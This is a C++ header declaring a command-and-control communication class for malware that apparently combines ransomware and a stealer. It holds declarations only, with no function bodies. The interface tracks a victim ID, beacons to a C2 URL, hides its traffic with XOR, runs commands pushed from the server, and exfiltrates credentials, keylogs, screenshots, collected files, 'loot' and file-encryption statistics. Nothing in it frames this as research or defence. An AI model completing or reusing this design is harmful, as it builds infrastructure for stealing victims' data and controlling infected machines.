#ifndef C2_COMMUNICATION_H
#define C2_COMMUNICATION_H

#include <string>
#include <vector>
#include <map>
#include <functional>
#include <thread>
#include <mutex>
#include <atomic>
#include <chrono>
#include <random>
#include <sstream>
#include <iomanip>
#include <fstream>

#ifdef _WIN32
#include <windows.h>
#include <winhttp.h>
#include <iphlpapi.h>
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "iphlpapi.lib")
#else
#include <curl/curl.h>
#include <unistd.h>
#include <sys/utsname.h>
#include <ifaddrs.h>
#include <arpa/inet.h>
#endif

class C2Communication {
private:
    std::string c2_url;
    std::string victim_id;
    std::string beacon_endpoint;
    std::string upload_endpoint;
    std::string command_endpoint;
    std::atomic<bool> running;
    std::thread beacon_thread;
    std::thread command_thread;
    std::mutex command_mutex;
    int beacon_interval_seconds;
    int max_retries;
    
    // Callbacks
    std::function<void(const std::string&)> on_execute_command;
    
    // Helper functions
    std::string generate_victim_id();
    std::string get_machine_info();
    std::string url_encode(const std::string& value);
    std::string base64_encode(const unsigned char* data, size_t len);
    std::string base64_decode(const std::string& encoded);
    std::string create_json(const std::map<std::string, std::string>& data);
    bool parse_json(const std::string& json, std::map<std::string, std::string>& output);
    
    // HTTP request methods
    bool http_post(const std::string& url, const std::string& data, std::string& response);
    bool http_get(const std::string& url, std::string& response);
    
    // Encryption for C2 traffic
    std::string xor_encrypt(const std::string& payload);
    std::string xor_decrypt(const std::string& payload);
    
public:
    C2Communication();
    ~C2Communication();
    
    void initialize(const std::string& c2_server);
    void start();
    void stop();
    void send_status(const std::string& status, const std::map<std::string, std::string>& extra = {});
    void send_encryption_stats(int encrypted_files, int failed_files, long long total_size);
    void send_credentials(const std::string& cred_type, const std::string& data);
    void send_screenshot(const std::string& image_path);
    void send_keylog(const std::string& log_data);
    void send_collected_files(const std::string& zip_path);
    void send_loot(const std::string& loot_type, const std::string& loot_data);
    void send_file(const std::string& file_path, const std::string& file_type);
    
    void set_command_callback(std::function<void(const std::string&)> callback);
    void poll_commands();
    
    bool is_connected() const;
    std::string get_victim_id() const { return victim_id; }
};

#endif // C2_COMMUNICATION_H
